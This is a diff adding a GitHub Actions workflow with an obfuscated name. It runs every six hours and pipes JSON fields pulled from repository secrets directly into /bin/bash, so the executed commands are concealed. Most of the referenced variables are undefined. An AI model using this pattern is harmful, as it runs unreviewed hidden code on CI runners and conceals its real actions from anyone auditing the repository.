@@ -1,0 +1,27 @@
+name: huifadouhuihaipa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huifadouhuihaipa
+        env:
+          olh00: ${{ secrets.olh00 }}
+        run: |
+          echo $olh00 | jq -r .drpyh4911 | /bin/bash
+          echo $j04091 | jq -r .km96 | /bin/bash
+          echo $isz50 | jq -r .rccl566 | /bin/bash
+          echo $yx8 | jq -r .qjv376 | /bin/bash
+          echo $oert164 | jq -r .kutau59 | /bin/bash
+          echo $itbm4 | jq -r .mra45 | /bin/bash
+          echo $qgs6 | jq -r .omovf1598 | /bin/bash
+          echo $mjs063 | jq -r .hhtpr621 | /bin/bash
+          echo $gqhv2 | jq -r .ixigh20 | /bin/bash
+          echo $vtinh6 | jq -r .z0 | /bin/bash
+
